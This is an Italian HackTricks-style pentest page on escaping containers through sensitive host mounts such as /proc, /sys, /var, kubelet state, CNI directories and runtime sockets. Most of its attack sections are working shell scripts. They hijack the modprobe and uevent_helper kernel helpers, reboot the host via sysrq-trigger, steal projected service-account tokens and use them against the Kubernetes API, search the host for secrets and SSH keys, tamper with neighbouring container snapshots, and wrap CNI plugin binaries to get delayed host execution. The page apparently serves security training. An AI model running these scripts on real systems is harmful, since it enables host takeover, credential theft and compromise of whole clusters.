# Mount sensibili dell'host

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Gli host mount sono una delle superfici pratiche più importanti per l'escape dai container, perché spesso annullano una vista dei processi accuratamente isolata, ripristinando la visibilità diretta sulle risorse dell'host. I casi pericolosi non si limitano a `/`. I bind mount di `/proc`, `/sys`, `/var`, dei socket di runtime, dello stato gestito da kubelet o dei percorsi relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container adiacenti e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine sulla protezione perché il modello di abuso è trasversale. Un host mount scrivibile è pericoloso in parte a causa dei mount namespace, in parte a causa degli user namespace, in parte per la copertura di AppArmor o SELinux e in parte a causa del percorso esatto dell'host che è stato esposto. Trattarlo come argomento autonomo rende la superficie d'attacco molto più facile da analizzare.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone voci proc scrivibili impreviste può quindi portare alla divulgazione di informazioni, a un denial of service o all'esecuzione diretta di codice sull'host.

I percorsi procfs di maggior valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (in particolare `register` e `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Inizia verificando quali voci procfs di maggior valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi percorsi sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare percorsi di code execution sull'host quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di reconnaissance per il kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto di processi, cgroup e filesystem, che può aiutare a ricostruire la struttura dell'host dall'interno del container.

Il valore pratico di ogni percorso è diverso, e trattarli tutti come se avessero lo stesso impatto rende più difficile il triage:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei percorsi procfs con il maggiore impatto, perché il kernel eseguirà un pipe handler dopo un crash. Un container che può impostare `core_pattern` su un payload memorizzato nel proprio overlay o in un percorso host montato può spesso ottenere code execution sull'host. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo percorso controlla l'userspace helper utilizzato dal kernel quando deve invocare la logica di module-loading. Se scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro primitive di code execution sull'host. È particolarmente interessante se combinato con un modo per attivare l'helper path.
- `/proc/sys/vm/panic_on_oom`
Questo normalmente non è un escape primitive pulito, ma può trasformare la pressione sulla memoria in denial of service a livello dell'host, convertendo le condizioni OOM in un comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere code execution nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per il triage di kernel exploit. Aiuta a determinare quali sottosistemi, mitigazioni e funzionalità opzionali del kernel sono abilitate senza dover consultare i metadata dei pacchetti dell'host.
- `/proc/sysrq-trigger`
Principalmente un percorso di denial of service, ma molto grave. Può riavviare, causare un panic o interrompere immediatamente in altro modo l'host.
- `/proc/kmsg`
Rivela i messaggi del kernel ring buffer. Utile per l'host fingerprinting, l'analisi dei crash e, in alcuni ambienti, per fare leak di informazioni utili al kernel exploitation.
- `/proc/kallsyms`
È prezioso quando è leggibile, perché espone informazioni sui kernel symbol esportati e può aiutare a superare le assunzioni sull'address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
Questa è un'interfaccia diretta alla memoria dei processi. Se il processo target è raggiungibile con le necessarie condizioni di tipo ptrace, può consentire di leggere o modificare la memoria di un altro processo. L'impatto realistico dipende fortemente da credenziali, `hidepid`, Yama e restrizioni ptrace, quindi è un percorso potente ma condizionale.
- `/proc/kcore`
Espone una vista della memoria di sistema simile a un core image. Il file è enorme e scomodo da usare, ma se è realmente leggibile indica una superficie di memoria dell'host gravemente esposta.
- `/dev/kmem` e `/dev/mem`
Queste sono storicamente interfacce **device** alla memoria raw con un impatto elevato, non file procfs. Su molti sistemi moderni sono assenti o fortemente limitate, ma un container che può aprire una copia montata dall'host dovrebbe considerare l'esposizione critica. Esaminale insieme agli altri mount `/dev` sensibili invece di cercare gli inesistenti percorsi `/proc/kmem` o `/proc/mem`.
- `/proc/sched_debug`
Fa leak di informazioni sullo scheduling e sui task, che possono esporre le identità dei processi dell'host anche quando le altre viste dei processi appaiono più pulite del previsto.
- `/proc/[pid]/mountinfo`
È estremamente utile per ricostruire dove si trova realmente il container sull'host, quali percorsi sono supportati da overlay e se un mount scrivibile corrisponde a contenuti dell'host o solo al layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il percorso host del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diversi trucchi di host-execution richiedono di convertire un percorso all'interno del container nel percorso corrispondente dal punto di vista dell'host.

### Esempio: preparazione del percorso helper di `modprobe`

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il percorso dell'helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante. La directory upper di overlay deve essere risolta dall'host e l'output di prova deve essere scritto nuovamente nello stesso layer del container visibile dall'host se il container non monta anche `/tmp` dell'host:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel e non viene deliberatamente ipotizzato. Ripristina il valore originale prima di lasciare il lab. Il punto importante è che un helper path scrivibile può reindirizzare una futura invocazione dell'helper del kernel verso contenuti del host path controllati dall'attacker. Un `upperdir` overlay mancante, un path che l'host non riesce a risolvere, un mount sysctl in sola lettura o un kernel che non invoca mai l'helper selezionato interrompono questa catena.

### Esempio completo: Kernel Recon con `kallsyms`, `kmsg` e `config.gz`

Se l'obiettivo è valutare l'exploitability anziché ottenere immediatamente l'escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a determinare se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano dettagli interessanti sullo stato e quali funzionalità o mitigazioni del kernel sono state compilate. L'impatto di solito non consiste in un escape diretto, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Esempio completo: riavvio dell'host con SysRq

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è un riavvio immediato dell'host. Non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei dispositivi. Alcuni percorsi di sysfs sono principalmente utili per il fingerprinting, mentre altri possono influenzare l'esecuzione degli helper, il comportamento dei dispositivi, la configurazione dei moduli di sicurezza o lo stato del firmware.

I percorsi sysfs di alto valore includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono importanti per motivi diversi. `/sys/class/thermal` può influenzare il comportamento della gestione termica e quindi la stabilità dell'host in ambienti con esposizione errata. `/sys/kernel/vmcoreinfo` può esporre informazioni sui crash dump e sul layout del kernel utili per il fingerprinting a basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` utilizzata dai Linux Security Modules, quindi un accesso imprevisto può esporre o modificare lo stato relativo al MAC. I percorsi delle variabili EFI possono influenzare le impostazioni di boot supportate dal firmware, rendendoli molto più seri dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori, con molte meno garanzie di sicurezza rispetto alle API del kernel hardened destinate alla produzione.

Ogni voce sysfs presente in questo elenco dipende dal **kernel, dalla configurazione e dall'hardware**. Gli attuali nodi virtualizzati spesso omettono completamente `uevent_helper`, le variabili EFI e le voci dei dispositivi termici. Registra un percorso assente come prerequisito negativo invece di presumere che un esempio proveniente da un altro kernel sia applicabile.

Comandi utili per la revisione di questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti questi comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un altro LSM è visibile in un modo che avrebbe dovuto rimanere accessibile solo dall’host.
- `/sys/kernel/debug` è spesso il finding più allarmante di questo gruppo. Se `debugfs` è montato e leggibile o scrivibile, aspettati un’ampia superficie rivolta al kernel, il cui rischio esatto dipende dai nodi di debug abilitati.
- L’esposizione delle variabili EFI è meno comune, ma ha un impatto elevato perché riguarda impostazioni supportate dal firmware anziché normali file di runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell’host e l’interazione con l’hardware, non per una semplice escape in stile shell.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte di host-fingerprinting e crash analysis, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

`/sys/kernel/uevent_helper` dipende dal kernel e dalla configurazione ed è assente su molti sistemi attuali. Se esiste, è scrivibile ed è disponibile un trigger `uevent` utilizzabile, il kernel potrebbe eseguire un helper controllato dall’attacker. L’output di proof deve usare un path visibile sia dalla vista dell’host sia da quella del container:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Il motivo per cui funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host anziché all'interno del container corrente. `/sys/class/mem/null/uevent` è un trigger concreto sui kernel che lo espongono; altri dispositivi potrebbero esporre i propri file `uevent`, ma non selezionarne uno alla cieca sull'hardware reale. Ripristina il valore originale prima di lasciare il lab. Non segnalare questa tecnica come disponibile quando il file dell'helper o un trigger controllato sono assenti.

## Esposizione di `/var`

Montare il `/var` dell'host in un container viene spesso sottovalutato perché non appare drammatico quanto il montaggio di `/`. In pratica, può essere sufficiente per raggiungere socket di runtime, directory degli snapshot dei container, volumi dei pod gestiti da kubelet, token degli account di servizio proiettati e filesystem delle applicazioni adiacenti. Sui nodi moderni, `/var` è spesso il luogo in cui si trova effettivamente lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i token proiettati di altri pod e il contenuto degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché chiariscono se il mount espone solo dati applicativi irrilevanti oppure credenziali del cluster ad alto impatto. Un service-account token leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso all'API di Kubernetes.

Se il token è presente, verifica a cosa può accedere invece di fermarti alla sola individuazione del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto può essere molto maggiore del semplice accesso al nodo locale. Un token con RBAC ampio può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Esempio di Docker e containerd

Sugli host Docker, i dati rilevanti si trovano spesso in `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi in `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone il contenuto scrivibile di uno snapshot di un altro workload, l’attacker potrebbe riuscire a modificare i file dell’applicazione, inserire contenuti web o cambiare gli script di avvio senza toccare la configurazione del container corrente.

Su un **workload di laboratorio usa e getta**, il contenuto scrivibile dello snapshot può dimostrare la manomissione dell’applicazione, il recupero di secret o il movimento laterale. Associa prima l’ID del container runtime allo snapshot esatto e non modificare mai uno snapshot non correlato o di produzione:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto dei `/var` montati: manomissione delle applicazioni, recupero di secret e lateral movement verso workload adiacenti.

Le scritture dirette degli snapshot bypassano la normale gestione dello stato del runtime e possono corrompere il container o distruggere le prove. La discovery in sola lettura è stata riprodotta localmente su Docker `overlay2`: un marker scritto in un container disposable adiacente è comparso sotto `/var/lib/docker/overlay2/<id>/diff/`. Limitare la modifica effettiva degli snapshot a un container disposable creato per questo test.

## Stato di Kubelet, plugin e percorsi CNI

Un mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` è spesso esposto tramite DaemonSet privilegiati, agent CNI, plugin CSI node, operator GPU e helper per lo storage. Questi mount sono facili da liquidare come "node plumbing", ma si trovano direttamente nel percorso di esecuzione per i nuovi pod e spesso contengono credenziali di kubelet, secret proiettati, socket di registrazione e binari eseguibili dei plugin lato host.

Tra i target di alto valore figurano:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

I comandi di review utili sono:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Perché questi percorsi sono importanti:

- `/var/lib/kubelet/pki` può esporre certificati client del kubelet e altre credenziali locali al nodo che, in alcuni casi, possono essere riutilizzati contro l'API server o gli endpoint TLS esposti dal kubelet, a seconda della progettazione del cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` contiene spesso token di service account proiettati e Secrets montati per i pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è principalmente una superficie di ricognizione, ma molto utile: rivela quali pod e container utilizzano attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali al nodo e scarse.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali plugin CSI, DRA e device plugin sono installati e con quali socket il kubelet dovrebbe comunicare. Se queste directory sono scrivibili anziché soltanto leggibili, il finding diventa molto più grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente nel percorso di configurazione della rete dei pod. L'accesso in scrittura è spesso una primitiva di host execution ritardata, non una semplice esposizione della configurazione.<sup>[[2]](#references)</sup>

### Esempio completo: `/opt/cni/bin` scrivibile

Se una directory host contenente i binary CNI è montata in lettura-scrittura, sostituire un plugin può essere sufficiente per ottenere host execution la prossima volta che il kubelet crea una sandbox per pod su quel nodo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Questo non è immediato quanto un `docker.sock` montato, ma è spesso più realistico nei pod dell’infrastruttura Kubernetes compromessi. Il marker viene scritto accanto al plugin montato, così il container può recuperarlo anche senza un mount della root dell’host o di `host-/tmp`. Il wrapper conserva gli argomenti originali e lo standard input, quindi l’esempio ripristina il binario originale. Il punto importante è che il binario modificato viene successivamente eseguito dal flusso di configurazione della rete dell’host, non dal container corrente. Usa solo un nodo usa e getta, perché un wrapper non valido può impedire ai nuovi sandbox dei Pod di ricevere la configurazione di rete.

## Socket runtime

I mount sensibili dell’host includono spesso socket runtime anziché directory complete. Sono così importanti da meritare una ripetizione esplicita:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi completi di exploitation una volta montato uno di questi socket.

Come rapido pattern di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste operazioni ha successo, il percorso da un "socket montato" all'avvio di un container fratello più privilegiato è solitamente molto più breve rispetto a qualsiasi percorso di breakout del kernel.

## Task Hijack tramite un Host Path scrivibile

Un mount host scrivibile non deve necessariamente esporre `/` per essere pericoloso. Se il percorso montato contiene script, file di configurazione, hook, plugin o file utilizzati successivamente da un task pianificato o da un servizio lato host, il container potrebbe essere in grado di modificare ciò che l'host esegue.

Flusso di revisione generico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se un file scrivibile viene utilizzato da un processo dell'host, durante i test mantieni il payload semplice e osservabile:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La parte interessante è il trust boundary: la scrittura avviene dall'interno del container, ma l'esecuzione avviene successivamente nel contesto del servizio host. Questo trasforma un hostPath o un bind mount limitato in una primitiva di delayed host-code-execution.

## CVE correlate ai mount

Gli host mount interagiscono anche con le vulnerabilità del runtime. Tra gli esempi recenti più importanti figurano:

- `CVE-2024-21626` in `runc`, dove un file descriptor di directory esposto poteva collocare la working directory sul filesystem host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, dove Dockerfile, frontend e flussi `RUN --mount` malevoli potevano reintrodurre l'accesso ai file host, la loro eliminazione o privilegi elevati durante le build.
- `CVE-2024-1753` nei flussi di build di Buildah e Podman, dove bind mount appositamente creati durante la build potevano esporre `/` in lettura-scrittura.
- `CVE-2025-47290` in `containerd` 2.1.0, dove una condizione TOCTOU durante l'unpack di un'immagine poteva consentire a un'immagine appositamente creata di modificare il filesystem host durante il pull.

Queste CVE sono rilevanti in questo contesto perché mostrano che la gestione dei mount non riguarda soltanto la configurazione dell'operatore. Anche il runtime può introdurre condizioni di escape basate sui mount.

## Controlli

Usa questi comandi per individuare rapidamente le esposizioni ai mount di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Cosa è interessante qui:

- La root dell'host, `/proc`, `/sys`, `/var` e i socket di runtime sono tutti risultati ad alta priorità.
- Le entry scrivibili di proc/sys spesso indicano che il mount espone controlli del kernel globali dell'host anziché una vista sicura del container.
- I path `/var` montati richiedono una verifica delle credenziali e dei workload adiacenti, non solo del filesystem.
- Le directory dello stato di Kubelet e i path CNI/plugin meritano la stessa priorità dei socket di runtime, perché spesso si trovano direttamente nel percorso di creazione dei pod e distribuzione delle credenziali del nodo.

## Stato della validazione locale

Le catene pratiche in questa pagina sono state verificate su un nodo Linux minikube locale. La validazione ha riprodotto:

- accesso in lettura e scrittura tramite un `hostPath` temporaneamente scrivibile
- individuazione dei token ServiceAccount proiettati e dei Secrets montati tramite `/var/lib/kubelet/pods`
- autenticazione riuscita all'API Kubernetes con un token attivo recuperato dallo stato montato di kubelet
- individuazione in sola lettura di un filesystem `overlay2` Docker adiacente tramite `/var` montato
- creazione tramite Docker API di un container sibling con un bind host in sola lettura attraverso un `docker.sock` montato
- esecuzione ritardata sull'host tramite un hook temporaneo consumato dall'host
- una simulazione di CNI-wrapper che ha preservato gli argomenti, lo standard input e l'esecuzione del plugin originale

Lo stesso nodo esponeva `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` e `config.gz`, ma non esponeva `uevent_helper`, le variabili EFI, le entry termiche o `sched_debug`. I trigger distruttivi del kernel non sono stati eseguiti. Ciò conferma che le catene relative a root dell'host, `/var`, stato di kubelet, socket e consumer dell'host sono riproducibili, mentre le tecniche helper di procfs/sysfs devono rimanere condizionali rispetto al kernel esatto, alla modalità di mount, al path del payload e al trigger.

## References

- [1] [File e path locali usati da Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Il container cilium-agent può accedere all'host tramite un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
